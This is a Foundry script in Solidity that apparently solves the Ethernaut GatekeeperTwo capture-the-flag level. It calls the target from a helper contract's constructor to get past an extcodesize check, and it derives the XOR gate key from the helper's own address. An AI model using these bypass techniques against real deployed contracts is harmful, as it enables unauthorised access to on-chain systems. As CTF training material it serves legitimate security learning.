/*
This gatekeeper introduces a few new challenges. Register as an entrant to pass this level.

Things that might help:
Remember what you've learned from getting past the first gatekeeper - the first gate is the same.
The assembly keyword in the second gate allows a contract to access functionality that is not native to vanilla Solidity. See Solidity Assembly for more information. 
The extcodesize call in this gate will get the size of a contract's code at a given address - you can learn more about how and when this is set in section 7 of the yellow paper.
The ^ character in the third gate is a bitwise operation (XOR), and is used here to apply another common bitwise operation (see Solidity cheatsheet). 
The Coin Flip level is also a good place to start when approaching this challenge.

*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GatekeeperTwo} from "src/GatekeeperTwo.sol";
import {Script} from "lib/forge-std/src/Script.sol";
import {console} from "lib/forge-std/src/console.sol";

contract Gate {
    GatekeeperTwo public gatekeeperTwo;

    // you have to run exploit in constructor to pass the second gate, because in constructor, contract is not deployed yet, so extcodesize is 0
    constructor(GatekeeperTwo _gatekeeperTwo) {
        gatekeeperTwo = _gatekeeperTwo;
        console.log("address of gate:", address(this));
        uint64 _key = uint64(bytes8(keccak256(abi.encodePacked(address(this)))))
            ^ uint64(0x000000000000000000000000000000000000000000000000ffffffffffffffff);
        // gatekeeperTwo.enter(0x773dd79b1cda9cbd);
        gatekeeperTwo.enter(bytes8(_key));
    }
}

contract GatekeeperTwoSolution is Script {
    GatekeeperTwo public gatekeepertwo = GatekeeperTwo(0xC85a78FFD9D2999C65EB3d0eF3344E5eAd700b3a);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Gate gate = new Gate(gatekeepertwo);
        console.log(address(gate));
        console.log("Entrant:", gatekeepertwo.entrant());
        vm.stopBroadcast();
    }

    fallback() external payable {}
    receive() external payable {}
}
